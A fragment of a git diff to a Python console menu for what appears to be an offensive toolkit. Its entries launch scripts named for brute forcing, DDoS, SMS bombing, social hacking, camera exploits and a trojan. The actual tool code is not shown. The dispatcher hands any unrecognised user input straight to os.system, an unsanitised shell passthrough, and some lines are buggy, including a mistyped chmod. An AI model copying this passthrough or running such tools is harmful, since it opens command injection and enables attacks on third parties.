-    	if module == "{php_name}.php":
-    		os.system("php {php_name}.php")
-    if help_input == "t-11":
-    	os.system("python3 BRUTEFORCE.py")
-    	add_job("python3 BRUTEFORCE.py")
-    if help_input == "t-13":
-    	os.system("python3 +90wifitools.py")
-    if help_input == "t-14":
-    	os.system("python3 socialhack.py")
-    if help_input == "star":
-        os.system("""
-    			chmod +x intframework
-				cd intframework
-				chmod +x +90wifitools.py
-				chmod +x DDOS.py
-				chmod +x DISCORD.py
-				chmod +x DİSCORD.py
-				chmod +x OSINT.py
-				chmod +x SMSBOMBER.py
-				chmod +x base.py
-				chmod +x build.sh
-				chmod +x camexp2.py
-				chmod +x data.json
-				chmod +x emailfinder.py
-				chmod +x expcamera.py
-				chmod +x id-collector.py
-				chmo:d +x installintconsole.py
-				chmod +x int.desktop
-				chmod +x intSHARK.py
-				chmod +x intai.py
-				chmod +x intautoupdate.py
-				chmod +x intconsoleV4.py
-				chmod +x intikam21.py
-				chmod +x introjan
-				chmod +x oip
-				chmod +x intweb
-				chmod +x intcam.py
-				chmod +x sendemail.py
-				chmod +x startoolkit.py
-				chmod +x terbuild.sh				
-    		""")
-        print("chmoded all tools")
+    	exit()
     if help_input == "neofetch":
     	os.system("python3 neofetch.py")
     	add_job("neofetch")
     if help_input == "osint":
     	print("https://osintframework.com/")
-    elif help_input == "whoami":
+    if help_input == "whoami":
     	username = getpass.getuser()
     	# Sistemin platform bilgisini alma
     	platform_info = platform.system()
@@ -2117,29 +1449,12 @@ python3 Intıkam21.py""")
     help = {"com-help" or "Com-help" or "Com-Help" or "com-HELP" or "COM-help" or "COM-HELP"}
     if help_input in help:
     	os.system("help")
-    valid_commands = {
-    "t-14", "t-13", "12", "t-11", "t-10", "t-9", "t-8", "t-7", "t-6", "t-5", "t-4", "t-3", "t-2", "t-1",
-    "exp-11", "exp-10", "exp-9", "exp-8", "exp-7", "exp-6", "exp-5", "exp-4",
-    "exp-3", "exp-2", "exp-1", "neofetch", "com-help", "intshark", "oip", "introjan", "intai", "track", "build", "mode-admin", "use", "set", "show", "build", "mode-", "back", "item", "search", "show commands", "int install", "connect", "int", "install", "mode-ninja", "int install mode-ninja", "int install git", "int install aichat", "use", "exploit", "bset", "banner", "py-search", "payload-search", "exp-search", "exploit-search", "jobs", "jobs -k", "dns", "help", "use ", "intcrawler", "searchuser", "mailsearch", "phonesearch", "connectbot", "meterpreter", "shotgun", "imei", "exp-search", "py-search"
-    }
-    
-    if help_input.lower() not in valid_commands:
+    if help_input in valid_commands or any(help_input.startswith(cmd) for cmd in valid_commands):
+    	continue
+    else:
+    	t.sleep(0.75)
     	self_dir = os.getcwd()
     	os.system("cd ~")
     	os.system(help_input)
     	add_job(help_input)
     	os.system(f"cd {self_dir}")
-    if help_input == "intai" or help_input == "İntai" or  help_input == "İNTAİ" or help_input == "İNTai" or help_input == "intAİ":
-    	os.system("python3 intai.py")
-    	add_job("intai")
-    if help_input == "intaiv2" or help_input == "İntaiv2" or help_input == "İntaiV2"or help_input == "İNTAİV2" or help_input == "İNTaiv2" or help_input == "intAİ" or help_input == "İNTaiV2" or help_input == "intAİV2":
-    	s = os.getcwd()
-    	os.system(f"""
-    	cd ~
-    	cd intframework
-    	cd modules
-    	""")
-    	os.system("python3 intaiV2.py")
-    	os.system(f"cd {s}")
-    	add_job("intaiv2")
-    	
